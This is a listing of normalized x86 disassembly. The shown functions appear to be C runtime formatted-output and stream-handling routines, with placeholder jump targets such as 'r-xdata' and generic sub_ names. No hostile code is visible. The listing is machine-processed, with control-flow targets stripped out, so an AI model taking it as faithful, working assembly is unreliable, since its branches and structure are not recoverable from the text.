lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_42ae11
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_42578a
push [ ebp - 0x8 ]
call sub_42578a
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_433449
push ebx
call sub_42578a
push [ ebp - 0x8 ]
call sub_42578a
push [ ebp - 0x4 ]
call sub_42578a
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_42578a
push [ esi + 0xb0 ]
call sub_42578a
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_4338e0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_438b6e
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_43395a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_437094
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4268f3
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_4268f3
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_429e89
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_436fc0
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_438de0
pop ecx
test eax eax
jne r-xdata
call sub_429e89
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_436fc0
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_438d97
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_438cad
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_433abe
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_438e36
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_433aed
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_433abe
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_433b14
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_433abe
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_433abe
pop ecx
sub_433ba2
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_42b774
call sub_4268f3
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_43474a ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_433abe
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_42578a
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_433b14
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_439e5a
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_439e70
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_433b14
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_433abe
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_42acad
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_437480
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_433abe
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_433abe
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_427be0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_439e70
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_433abe
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_43476a
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_438e36
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_434799
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
push [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
dec [ ebp + 0xc ]
call sub_43476a
cmp [ esi ] 0xffffffff
pop ecx
je r-xdata
pop esi
pop ebp
retn
sub_4347c0
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_43476a
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_43476a
pop ecx
sub_434827
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_42b774
call sub_4268f3
mov [ ebp - 0x464 ] eax
test esi esi
jne r-xdata
xor esi esi
cmp edi esi
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x440 ] 0x0
je r-xdata
movzx edx [ edi ]
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x414 ] esi
mov [ ebp - 0x43c ] esi
mov [ ebp - 0x458 ] esi
mov [ ebp - 0x420 ] edx
cmp dx si
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop ecx
add edi ecx
mov [ ebp - 0x460 ] edi
cmp [ ebp - 0x418 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x43c ] esi
je r-xdata
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
cmp [ ebp - 0x43c ] 0x7
jne r-xdata
xor eax eax
movzx eax dx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov esi [ ebp - 0x43c ]
imul eax eax 0x9
movzx eax [ eax + esi + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x43c ] eax
cmp eax esi
je r-xdata
mov edi [ ebp - 0x460 ]
mov ebx [ ebp - 0x41c ]
jmp [ eax * 4 + jump_table_4353c7 ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x42c ]
push edx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x430 ] 0x1
call sub_43476a
pop ecx
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
movzx eax [ edi ]
xor esi esi
mov [ ebp - 0x420 ] eax
cmp ax si
je r-xdata
or [ ebp - 0x408 ] ecx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x428 ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x428 ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x428 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
